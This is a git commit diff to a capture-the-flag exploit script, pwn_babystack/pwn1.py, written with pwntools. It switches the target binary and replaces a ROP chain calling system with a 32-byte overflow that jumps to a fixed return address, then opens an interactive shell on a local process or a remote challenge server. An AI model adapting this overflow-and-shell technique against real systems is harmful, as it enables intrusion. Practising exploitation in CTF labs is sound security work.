8ce40037947463bd70e48df852bb3e0e541fe45a
ywledoc <ywledoc@outlook.com>
2021-03-09 14:01:11 +0800

    更换题目

--- pwn_babystack/pwn1.py
+++ pwn_babystack/pwn1.py
@@ -7,18 +7,18 @@ import sys
 if sys.argv[1] == '1':
     p = remote("114.116.54.89",  10004)
 else:
-    p = process("./pwn4")
+    p = process("./pwn1")
 
 #context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
 context.log_level = "debug"
 #gdb.attach(proc.pidof(p)[0])
 
-elf = ELF("./pwn4")
+elf = ELF("./pwn1")
 system_addr = elf.symbols["system"]
 print(hex(system_addr))
 
 #pause()
-payload = "a" * 16 + p64(0xdeadbeef) + p64(0x4007D3) + p64(0x60111f) + p64(elf.plt["system"])
+payload = "a" * 32 + p64(0xdeadbeef) + p64(0x401142)
 p.sendline(payload)
 
 p.interactive()
